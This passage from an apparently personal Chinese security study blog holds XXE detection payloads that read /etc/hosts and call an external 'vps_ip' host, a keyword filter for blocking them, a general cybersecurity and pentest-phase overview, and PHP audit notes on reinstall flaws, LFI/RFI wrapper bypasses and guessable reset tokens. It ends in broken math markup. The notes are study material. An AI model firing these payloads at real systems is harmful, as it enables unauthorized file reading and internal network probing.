<p>Revisting XXE and abusing protocols 【XXE+expect模块=&gt;Facbook RCE】</p>
<p>XXE on Windows system …then what ?? 【XXE+SMB=&gt;内网RCE】</p>
<p>Apache Solr XXE漏洞分析 【CVE-2018-8026】<br>
XXE自动化工具<br>
　　XXEinjector：一款功能强大的自动化XXE注射工具。</p>
<p>本文就不具体演示、讲述此工具了。推荐一篇文章，详细的讲述了其使用方法，最后还附了XXEinjector工具的下载。</p>
<p>寻找XXE<br>
检测xml是否被解析</p>
<p>尝试注入特殊字符，使XML失效，引发解析异常，明确后端使用XML传输数据。</p>
<p>单双引号 ' &quot; ：XML的属性值必须用引号包裹，而数据可能进入标签的属性值。<br>
尖括号&lt; &gt; ：XML的开始/结束标签用尖括号包裹，数据中出现尖括号会引发异常。<br>
注释符&lt;!-- ：XML使用<!-- This is a comment -->作注释。<br>
&amp; ：&amp; 用于引用实体。<br>
<code>CDATA 分隔符]]&gt; ：&lt;![CDATA[foo]]&gt;</code>中的内容不被解析器解析，提前闭合引发异常。<br>
检测是否支持外部实体解析</p>
<p>尝试利用实体和DTD。</p>
<pre><code>引用外部DTD文件访问内网主机/端口 ：&lt;!DOCTYPE a SYSTEM &quot;http://127.0.0.1:2333&quot;&gt;（看响应时间）
引用外部DTD文件访问外网 ：&lt;!DOCTYPE a SYSTEM &quot;http://vps_ip&quot; &gt;
引用内部实体 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe &quot;findneo&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
外部实体读本地文件 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/hosts&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
外部实体访问内网主机/端口 ：&lt;!DOCTYPE a SYSTEM &quot;http://192.168.1.2:80&quot;&gt;（看响应时间）
外部实体访问外网 ：&lt;!DOCTYPE a [&lt;!ENTITY xxe SYSTEM &quot;http://vps_ip&quot;&gt;]&gt;&lt;a&gt;&amp;xxe;&lt;/a&gt;
</code></pre>
<p>判断问题存在可以OOB提取数据。<br>
XXE的防御<br>
使用开发语言提供的禁用外部实体的方法<br>
　　PHP</p>
<p>libxml_disable_entity_loader(true);</p>
<p>JAVA</p>
<p>DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</p>
<p>dbf.setExpandEntityReferences(false);</p>
<p>Python</p>
<p>from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</p>
<p>过滤用户提交的XML数据<br>
　　过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC。</p>
<p>参考资料<br>
http://www.freebuf.com/column/156863.html<br>
https://security.tencent.com/index.php/blog/msg/69<br>
https://xz.aliyun.com/t/2571#toc-10<br>
http://www.w3school.com.cn/dtd/<br>
大家有任何问题可以提问，更多文章可到i春秋论坛阅读哟~<br>
来自FreeBuf.COM</p>
<h1 id="2021-07-20">2021-07-20</h1>
<p>#nmap的使用方法<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736650861.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736653159.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736655496.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736657736.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736660130.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736662968.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736665551.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736668085.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736670425.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736673446.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736677060.png" alt="" loading="lazy"><br>
<img src="https://jinqipiaopiao.github.io//post-images/1626736679820.png" alt="" loading="lazy"></p>
<p>#什么是网络安全？<br>
就像物理安全旨在保护人身财产和人员免受犯罪活动或意外损坏一样，网络安全保护计算机系统、后端系统和最终用户应用程序、这些系统的用户以及他们存储的数据。</p>
<p>网络安全旨在防止网络罪犯、恶意内部人员或其他人员访问、伤害、破坏或修改 IT 系统和应用程序。</p>
<p>网络安全的重要性<br>
随着人类社会数字化，我们生活的方方面面都得益于网络、计算机和其他电子设备以及软件应用。包括医疗保健、金融机构、政府和制造业在内的关键基础设施都使用计算机或智能设备作为其运营的核心部分。这些设备绝大多数连接到互联网。</p>
<p>威胁行为者比以往更有动力去寻找渗透这些计算机系统的方法，以谋取经济利益、敲诈勒索、政治或社会动机（称为黑客主义），或者仅仅是故意破坏。</p>
<p>在过去二十年中，针对所有发达国家的关键基础设施发动了网络攻击，无数企业遭受了灾难性的损失。全球每年有超过 2，000 起已确认的数据泄露事件，每次泄露平均花费超过 390 万美元（美国为 810 万美元）。自2000年以来，超过35亿人（占世界人口的一半）的私人信息被网络罪犯窃取。</p>
<p>安全漏洞和威胁几乎会影响任何系统，包括：<br>
通信——电话、电子邮件、短信和消息应用程序都可以用于网络攻击<br>
金融——当然，金融机构是攻击者的主要目标，任何处理银行或信用卡信息的组织都处于危险之中<br>
政府——政府机构通常成为网络罪犯的目标，他们可能追求公民个人信息或机密公共数据<br>
交通——互联汽车、交通控制系统和智能道路基础设施都面临网络威胁的风险<br>
医疗保健——从当地诊所的医疗记录到国家医院的重症监护系统，任何疾病都容易受到攻击<br>
教育机构、其机密的研究数据以及他们掌握的关于学生或教职员工的信息都面临受到攻击的风险<br>
在这些系统中，绝大多数网站和 Web 应用程序都是攻击者的网关。它们暴露在公共互联网上，通常连接到敏感的后端系统，是该组织安全战略中的一个薄弱环节</p>
<p>无论您的组织是任何规模的企业、接收大量流量的网站，还是为公共利益服务的机构或非营利组织，准备和抵御网络安全威胁都应该是您最关心的问题之一。</p>
<p><strong>网络安全原则</strong><br>
网络安全的主要目标是保护数据。安全界通常指确保数据安全的三角形，称为 CIA 三合会：</p>
<p>保密性——确保敏感数据仅对实际需要的人访问，并允许根据组织政策访问，同时阻止访问他人。<br>
完整性-确保数据和系统不会因为威胁行为者的行为或意外修改而进行修改。应采取措施防止腐败或丢失敏感数据，并在发生此类事件时迅速恢复。<br>
可用性-确保数据仍然可用，对其最终用户有用，并确保此访问不会因系统故障、网络攻击甚至安全措施本身而受阻。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626740013759.png" alt="" loading="lazy"><br>
中情局三合会定义了数据安全的三项关键原则</p>
<p>为了实现中情局的目标，组织必须保护两个方面或其 IT 环境：应用安全和数据安全。</p>
<p><strong>通用应用安全策略</strong><br>
应用程序安全性可确保面向用户的应用程序免受外部威胁、对托管或使用应用程序（端点）的设备的攻击以及内部威胁的渗透或破坏。以下是三种最常见的应用安全策略。</p>
<p><strong>DDoS保护</strong></p>
<p>分布式拒绝服务 （DDoS） 攻击使用攻击者控制的大量连接设备，用虚假流量淹没网站的资源。由于当今 DDoS 攻击的规模很大，因此常见的保护措施是基于云的 DDoS 缓解服务。这些服务使用 DNS 或 BGP 路由将流量转移到基于云的擦洗服务器、删除恶意请求并将合法请求转发到 Web 服务器。</p>
<p><strong>Web 应用程序防火墙</strong></p>
<p>网络应用防火墙 （WAF） 部署在网络边缘作为反向代理，检查网络应用程序的传入和出站 HTTP/S 流量，并过滤掉恶意流量。WAF 使用安全策略和威胁情报数据（如已知的不良流量源和已知的攻击模式）来确定哪些流量不应到达应用程序。</p>
<p><strong>高级机器人保护</strong></p>
<p>机器人是通过互联网执行操作的自动化程序。有些机器人是合法的，应该允许访问网站，而其他机器人是恶意的，可用于发起自动攻击。机器人管理是一个快速发展的领域，它使用机器人声誉数据库保护组织免受不良机器人的伤害，挑战测试机器人是否是真正的用户，以及识别可疑机器人行为的行为分析。</p>
<p><strong>通用数据安全策略</strong><br>
数据安全可确保外部方或未经授权的内部方无法访问数据，识别敏感数据的风险并解决这些风险，并设置检测方法以识别威胁行为者何时访问、修改或删除数据。以下是数据安全的三种常见策略。</p>
<p><strong>数据屏蔽</strong></p>
<p>许多数据泄露不是发生在生产环境中，而是发生在测试或 DevOps 环境中。这些环境通常不安全，但通常加载实时、敏感的客户数据。数据屏蔽使在测试服务器上使用逼真的数据成为可能，同时使用转换技术隐藏或争夺原始数据。</p>
<p><strong>漏洞发现</strong></p>
<p>许多软件系统都存在漏洞，黑客可能会利用这些漏洞来破坏系统。漏洞发现是一个依赖于漏洞数据库的过程，其中包含有关已知漏洞的详细信息。它允许组织检测哪些系统受到漏洞的影响，了解严重性和影响，并修复漏洞。</p>
<p><strong>端点安全</strong></p>
<p>组织中的端点设备数量正在爆炸式增长。有数百万台笔记本电脑、移动设备和物联网 （IoT 设备） 连接到互联网，并代表着日益严重的安全风险。</p>
<p>端点安全包括在每个端点部署代理，该代理可以提供下一代防病毒 （NGAV） 等安全功能，以检测零日攻击和内部威胁，以及端点检测和响应 （EDR），以帮助安全团队实时调查和阻止端点上的攻击。</p>
<p><strong>常见的网络威胁</strong><br>
网络安全形势复杂，数百万已知的威胁参与者和有案可查的战术、技术和程序 （TTP） 以及每天都在出现新型攻击。以下是您可能遭受的一些更常见的网络威胁：</p>
<p>威胁	        工作原理	对您的组织的风险<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626740233802.png" alt="" loading="lazy"><br>
<strong>构建网络安全战略</strong><br>
解决组织中的网络安全问题始于战略，该战略应得到高级管理层的支持，并与整个组织共享。</p>
<p>下面是一个可用于构建安全策略的过程：</p>
<p>1.执行计算资产清单-确定您的组织拥有哪些应用程序和数据，以及如果它们受到攻击或破坏的后果。创建需要保护的资产列表。<br>
2.确定合规性要求——您的组织是否遵守任何影响网络安全的法规或行业标准？识别与网络安全相关的合规要求，并将它们添加到受保护资产列表中。<br>
3.识别威胁和风险-审查影响您行业的威胁的全面列表，确定其中哪一个对您的组织最相关，并审查关键系统，以了解它们对攻击的脆弱程度。例如，运营网站的组织应关注网络应用程序威胁（如代码注入和恶意机器人），并对其 Web 应用程序进行评估，以了解其易受攻击性。<br>
4.优先考虑风险——鉴于您需要保护的系统、合规责任和常见威胁，请确定您面临的最大风险。哪些系统对企业最有价值，最有可能受到攻击？这是您应该针对您的网络安全计划的第一个风险。<br>
5.确定您的安全成熟度水平和现有模子——您的公司有网络安全计划吗？是否有内部工作人员或现有供应商提供安全服务？此外，还绘制出已经存在的网络安全措施。考虑保护物理设施（保安、服务器室锁着的门）、防火墙和防病毒等安全系统，以及组织使用的应用程序和服务（包括云服务）的安全措施。<br>
6.建立一个网络安全团队——利用组织中的现有员工，提高网络安全技能，雇佣新员工，并在必要时聘请顾问。创建一个有能力的团队，能够执行网络安全计划，以改善您的安全态势。<br>
7.为改善网络安全制定时间表和里程碑——您可以立即执行哪些快速胜利来改进对关键系统的保护？哪些长期措施需要更多时间，但对改善网络安全非常重要？制定至少 1-2 年的长期计划，每个季度都有明确的里程碑，表明安全团队应该实现什么目标。</p>
<p>7 网络安全趋势<br>
以下是网络安全社区中的重要趋势，您应该意识到这些趋势，因为您正在制定战略并选择您的工具集。</p>
<p><strong>1.网络安全和机器学习</strong><br>
过去，网络安全系统依靠手动定义的规则和人工检查来识别和分类安全事件。这是有效的，但有限，因为它需要高水平的专业知识来管理安全工具，并超载的安保人员。</p>
<p>许多现代安全工具使用机器技术实现安全决策自动化，而无需事先定义规则。这可以为安全团队节省大量时间，并导致对威胁做出更快、更准确的响应。</p>
<p>在网络安全中使用机器学习的几个例子是：</p>
<p>下一代防病毒 （NGAV）工具使用自动恶意软件分类，即使恶意软件与任何已知的二进制模式不匹配，也要识别恶意软件<br>
数据丢失预防 （DLP）系统使用机器学习读取文档或其他材料，并自动对其灵敏度进行分类<br>
电子邮件保护系统使用大量网络钓鱼与合法电子邮件的数据集进行培训，并且可以识别&quot;看起来像&quot;他们可能正在进行网络钓鱼尝试的电子邮件</p>
<p><strong>2.API 安全</strong><br>
应用程序编程接口 （API） 允许计算系统相互通信和共享数据。整个 API 经济已经出现，允许组织相互共享数据和软件功能。</p>
<p>虽然 API 为组织提供了很大的价值，但它们也代表着安全风险。对 API 安全重要性的认识有限，许多 API 端点缺乏基本的安全措施。攻击者可以操纵它们滥用 API 背后的服务，也可以成为组织关键系统的切入点。</p>
<p>在过去几年中，专门的 API 安全解决方案不断涌现，帮助组织锁定 API 端点、保护它们免受恶意流量的侵害，并抵御 DDoS 攻击。OpenAPI计划可帮助组织以标准化的方式定义其 API，从而能够执行建立在 API 功能基础上的安全政策。</p>
<p><strong>3.高级机器人保护</strong><br>
机器人是访问网站并执行自动操作的系统。例如，一些机器人是合法的，谷歌机器人爬行网站，以便将其添加到谷歌的搜索索引中。但其他机器人是恶意的，被威胁行为者用来对数百万个易受攻击的网站发起攻击。</p>
<p>机器人占当今网络流量的 58%，而整个22% 的 Web 流量归因于不良机器人。坏机器人可以安装在被攻击者破坏的最终用户设备上，形成巨大的僵尸网络。这些设备可能是家用电脑、服务器和物机设备，如游戏机或智能电视。 攻击者利用受损设备网络发动DDoS和许多其他类型的攻击。</p>
<p>机器人管理系统帮助组织识别不需要的机器人流量并将其过滤掉，同时允许合法的机器人流量和用户流量继续不间断。为此，他们需要使用各种方法（如：</p>
<p>声誉管理——管理已知的好坏机器人数据库<br>
设备指纹-识别操作系统或浏览器的属性，可能表示一个坏的机器人<br>
挑战——使机器人面临&quot;挑战&quot;，如动态页面元素或 CAPTCHA，人类用户能够处理这些内容，而机器人则无法处理这些挑战。</p>
<p><strong>4.文件安全</strong><br>
文件安全对于确保未经授权的各方（无论是内部还是外部）没有访问或篡改敏感数据至关重要。许多合规性标准要求组织对敏感数据文件实施严格控制，证明这些控制已经到位，并在发生违规时显示文件活动的审计跟踪。</p>
<p>文件安全技术可以自动识别可疑文件活动，这可能表示对数据渗透、勒索软件攻击的尝试，甚至是粗心大意的用户错误地删除文件或将其复制到不安全的位置。</p>
<p><strong>5.运行时应用程序自我保护</strong><br>
从历史上看，许多组织采用了应用程序安全测试 （AST） 工具，这些工具会自动扫描应用程序代码以发现代码质量问题和软件漏洞。今天，许多组织正在转向 Runtime 应用程序自我保护 （RASP），该保护程序在生产中运行时实时扫描和监控应用程序代码。</p>
<p>RASP 与 Web 应用程序一起部署。它监控流量和用户行为，如果检测到问题，它可以阻止特定的用户请求并提醒安全人员。RASP 不依赖于特定的攻击签名，并且能够阻止所有类别的攻击。</p>
<p>RASP 的独特元素是，它利用了应用程序源代码的内部知识。它知道应用程序的行为方式，并可以检测利用代码中的弱点（如代码注入和对已知漏洞的漏洞）的攻击。</p>
<p><strong>6.云安全</strong><br>
随着组织进行数字化转型并将任务关键工作量转移到云中，云安全成为网络安全战略的重要组成部分。保护云是一项挑战，因为基于云的系统没有传统的安全周长，并且可以让攻击者访问 IT 环境的几乎所有方面。</p>
<p>组织必须了解自己与其云提供商之间的责任划分，并正确配置云提供商提供的安全功能，特别是虚拟私有云 （VPC） 等网络隔离功能。他们还必须有一个强大的身份和访问管理 （IAM） 解决方案 - 定义用户帐户、角色和访问控制策略的方法。</p>
<p>在部署连接私有云和公共云或多个公共云之间的混合云或多云基础设施时，组织必须确保所有云环境中的安全性一致，并特别注意集成点。</p>
<p><strong>7.警报疲劳</strong><br>
组织从 IT 系统和安全工具收集大量日志和事件。现在，即使在中小型组织中，使用安全信息和事件管理 （SIEM） 来聚合安全数据并为安全团队创建警报也是很常见的。</p>
<p>警报数量之多，加上许多组织长期缺乏安保人员，导致警报疲劳。安全团队在一天的所有时间都会收到数千个警报，因此很难筛选警报并识别真正的安全事件。</p>
<p>这个问题并不新鲜，有几种方法可以减轻警报疲劳。例如，组织实施威胁情报，以识别警报何时与已知攻击者的签名或攻击模式相关联。计算机学习方法（如用户和事件行为分析 （UEBA）有助于识别异常行为，并自动评分以识别更有可能是恶意的事件。</p>
<p>#渗透测试阶段<br>
笔测试过程可分为五个阶段。<br>
<img src="https://jinqipiaopiao.github.io//post-images/1626740467866.png" alt="" loading="lazy"><br>
1.规划和侦察<br>
第一阶段涉及：</p>
<p>定义测试的范围和目标，包括要处理的系统和要使用的测试方法。<br>
收集情报（例如网络和域名、邮件服务器），以更好地了解目标的工作原理及其潜在漏洞。<br>
2.扫描<br>
下一步是了解目标应用程序将如何响应各种入侵尝试。这通常是使用：</p>
<p>静态分析–检查应用程序的代码，以估计其运行时的行为方式。这些工具可以在单次传递中扫描整个代码。<br>
动态分析–在运行状态下检查应用程序的代码。这是一种更实用的扫描方法，因为它为应用程序的性能提供了实时视图。<br>
3.获取访问<br>
本阶段使用 Web 应用程序攻击，如跨站点脚本、SQL 注射和后门，以发现目标的漏洞。然后，测试人员尝试利用这些漏洞，通常是通过升级权限、窃取数据、拦截流量等来了解它们可能造成的损害。</p>
<p>4.维护访问<br>
这一阶段的目标是看看漏洞是否可以用于在被利用的系统中实现持久存在-足够长的时间让不良行为者获得深入访问。其理念是模仿先进的持续威胁，这些威胁通常在系统中停留数月，以便窃取组织最敏感的数据。</p>
<p>5.分析<br>
渗透测试的结果随后汇编成一份报告，详细说明：</p>
<p>被利用的特定漏洞<br>
已访问的敏感数据<br>
笔测试员在未检测到的情况下在系统中停留的时间<br>
安全人员会分析此信息，以帮助配置企业的 WAF 设置和其他应用安全解决方案，以修补漏洞并防止未来的攻击。</p>
<p><strong>渗透测试方法</strong><br>
外部测试<br>
外部渗透测试针对的是互联网上可见的公司资产，例如 Web 应用程序本身、公司网站以及电子邮件和域名服务器 （DNS）。目标是访问和提取有价值的数据。</p>
<p>内部测试<br>
在内部测试中，能够访问防火墙后面应用程序的测试人员模拟恶意内部人员的攻击。这不一定是模拟流氓员工。常见的起始场景可能是其凭据因网络钓鱼攻击而被盗的员工。</p>
<p>盲测试<br>
在盲目测试中，测试者只给出被攻击企业的名称。这使安全人员能够实时了解实际应用攻击将如何发生。</p>
<p>双盲测试<br>
在双重盲测试中，安全人员事先并不知道模拟攻击。与现实世界一样，在试图突破之前，他们将没有时间加强防御。</p>
<p><strong>有针对性的测试</strong><br>
在这种情况下，测试人员和安全人员协同工作，并相互评估他们的动作。这是一个有价值的培训练习，为安全团队提供来自黑客观点的实时反馈。</p>
<p><strong>渗透测试和 Web 应用程序防火墙</strong><br>
渗透测试和 WAF 是排他性的，但互利的安全措施。</p>
<p>对于多种笔试（盲和双盲测试除外），测试人员可能会使用 WAF 数据（如日志）来定位和利用应用程序的弱点。</p>
<p>反过来，WAF 管理员可以从笔测试数据中受益。测试完成后，可以更新 WAF 配置，以抵御测试中发现的弱点。</p>
<p>最后，笔测试满足了安全审核程序的某些合规性要求，包括PCI DSS和SOC 2。某些标准，如PCI-DSS 6.6，只能通过使用经过认证的WAF来满足。然而，这样做并没有使笔测试有任何少用，因为它的上述好处和能力，以改善WAF配置。</p>
<p>#php代码审计</p>
<p><strong>安装的问题：</strong><br>
1自动删除这个安装的文件：通过生成一个lock文件，来判断程序是否安装过<br>
2根本无验证：安装完成后不会自动删除文件，又不会生成lock判断是否安装过<br>
3安装file：直接用get提交step2那么就直接进入下一步<br>
4变量覆盖导致重装：可以get，port，cookie任意提交一个变量名$insLockfile,给其赋空值，覆盖掉这个变量inslockfile从而让file_exists为false就不会退出<br>
5判断lock后，无exit：判断是否存在lock文件，如果存在lock文件，jiuhuiheader到index.php但<br>
是header后并没有exit，所以不会退出，类似的还有javascript弹个框<br>
6解析漏洞：在安装完成后会将install.php rename为install.php.bak但是由于apache的解析漏洞，如果无法识别最后一个后缀的话，就会向上解析，那么就会又生成php了,然后结合安装时的变量覆盖又成重装了</p>
<p><strong>包含漏洞</strong><br>
LFI：很多都限制了包含的后缀结尾必须为.php,例如include($a.'.php'),需要阶段后面的这.php<br>
1.00截断=gpc off &amp;&amp; php &lt; 5.3.4<br>
2.长文件名截断<br>
3.转换字符集造成的截断--<code>&lt;iconv()截断&gt;</code><br>
4.伪协议：截取字符判断是不是.php,用zip或者phar协议绕过：首先新建一个1.php，里卖弄phpinfo，然后压缩成.zipranhoubazip的名字改成yu.jpg，然后把这个.jpg上传上去然后包含<br>
5.包含日志环境变量</p>
<p>RFI：包含远程文件或者为协议php://input data等<br>
条件allow_url_include on默认off<br>
allow_url_include off 条件下RFI：allow_url_include为on，allow_url_fopen为off 伪协议<img src="https://jinqipiaopiao.github.io//post-images/1626748376060.png" alt="" loading="lazy"><br>
allow_url_include&amp;&amp;allow_url_fopen为off：包含共享文件<img src="https://jinqipiaopiao.github.io//post-images/1626748436559.png" alt="" loading="lazy">，互联网上445端口基本上被过滤<br>
allow_url_fopen默认on</p>
<p><strong>找回密码</strong><br>
验证token：再找回密码的时候生成一个token，然后存储到数据库中，然后把找回密码的地址发到邮件中url中就含有token由用户点开后就能修改密码<br>
延申：yixiecms的密码解密方式很难解，有时拿到了管理的密码破不掉，利用方法：一般找回密码使用的邮箱，首先吧管理的邮箱注入出来，然后再回去找密码，再把数据库的token注入出来，构造以下地址，就能进行重置密码<br>
rand函数生成token：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>e</mi><mi>s</mi><mi>e</mi><mi>t</mi><mi>p</mi><mi>w</mi><mi>d</mi><mo>=</mo><mi>m</mi><mi>d</mi><mn>5</mn><mo>(</mo><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mo>(</mo><mo>)</mo><mo>)</mo><mo separator="true">;</mo><mi mathvariant="normal">：</mi><mi mathvariant="normal">对</mi><mi>r</mi><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant="normal">（</mi><mi mathvariant="normal">）</mi><mi mathvariant="normal">函</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">生</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">出</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">行</mi><mi>m</mi><mi>d</mi><mn>5</mn><mi mathvariant="normal">，</mi><mi mathvariant="normal">某</mi><mi mathvariant="normal">些</mi><mi mathvariant="normal">平</mi><mi mathvariant="normal">台</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">例</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">（</mi><mi>w</mi><mi>i</mi><mi>n</mi><mi>d</mi><mi>o</mi><mi>w</mi><mi>s</mi><mi mathvariant="normal">）</mi><mi>r</mi><mi>a</mi><mi>n</mi><msub><mi>d</mi><mi>m</mi></msub><mi>a</mi><mi>x</mi><mi mathvariant="normal">只</mi><mi mathvariant="normal">有</mi><mn>32768</mn><mi mathvariant="normal">，</mi><mi mathvariant="normal">如</mi><mi mathvariant="normal">果</mi><mi mathvariant="normal">需</mi><mi mathvariant="normal">要</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">范</mi><mi mathvariant="normal">围</mi><mi mathvariant="normal">大</mi><mi mathvariant="normal">于</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">那</mi><mi mathvariant="normal">么</mi><mi mathvariant="normal">指</mi><mi mathvariant="normal">定</mi><mi>m</mi><mi>i</mi><mi>n</mi><mi mathvariant="normal">和</mi><mi>m</mi><mi>a</mi><mi>x</mi><mi mathvariant="normal">参</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">就</mi><mi mathvariant="normal">可</mi><mi mathvariant="normal">以</mi><mi mathvariant="normal">生</mi><mi mathvariant="normal">成</mi><mi mathvariant="normal">大</mi><mi mathvariant="normal">于</mi><mi mathvariant="normal">这</mi><mi mathvariant="normal">个</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">字</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">了</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">或</mi><mi mathvariant="normal">者</mi><mi mathvariant="normal">考</mi><mi mathvariant="normal">虑</mi><mi mathvariant="normal">哟</mi><mi mathvariant="normal">个</mi><mi>m</mi><msub><mi>t</mi><mi>r</mi></msub><mi>a</mi><mi>n</mi><mi>d</mi><mi mathvariant="normal">（</mi><mi mathvariant="normal">）</mi><mi mathvariant="normal">来</mi><mi mathvariant="normal">替</mi><mi mathvariant="normal">代</mi><mi mathvariant="normal">它</mi><mi mathvariant="normal">‘</mi></mrow><annotation encoding="application/x-tex">resetpwd=md5(rand());：对rand（）函数生成出来的数字进行md5，某些平台下例如（windows）rand_max只有32768，如果需要的范围大于这个数字，那么指定min和max参数就可以生成大于这个数字的数了，或者考虑哟个mt_rand（）来替代它
`</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">t</span><span class="mord mathdefault">p</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mclose">)</span><span class="mclose">)</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">：</span><span class="mord cjk_fallback">对</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord cjk_fallback">（</span><span class="mord cjk_fallback">）</span><span class="mord cjk_fallback">函</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">出</span><span class="mord cjk_fallback">来</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">行</span><span class="mord mathdefault">m</span><span class="mord mathdefault">d</span><span class="mord">5</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">某</span><span class="mord cjk_fallback">些</span><span class="mord cjk_fallback">平</span><span class="mord cjk_fallback">台</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">例</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">（</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">s</span><span class="mord cjk_fallback">）</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">a</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">有</span><span class="mord">3</span><span class="mord">2</span><span class="mord">7</span><span class="mord">6</span><span class="mord">8</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">如</span><span class="mord cjk_fallback">果</span><span class="mord cjk_fallback">需</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">范</span><span class="mord cjk_fallback">围</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">那</span><span class="mord cjk_fallback">么</span><span class="mord cjk_fallback">指</span><span class="mord cjk_fallback">定</span><span class="mord mathdefault">m</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord cjk_fallback">和</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">参</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">成</span><span class="mord cjk_fallback">大</span><span class="mord cjk_fallback">于</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">字</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">了</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">或</span><span class="mord cjk_fallback">者</span><span class="mord cjk_fallback">考</span><span class="mord cjk_fallback">虑</span><span class="mord cjk_fallback">哟</span><span class="mord cjk_fallback">个</span><span class="mord mathdefault">m</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t 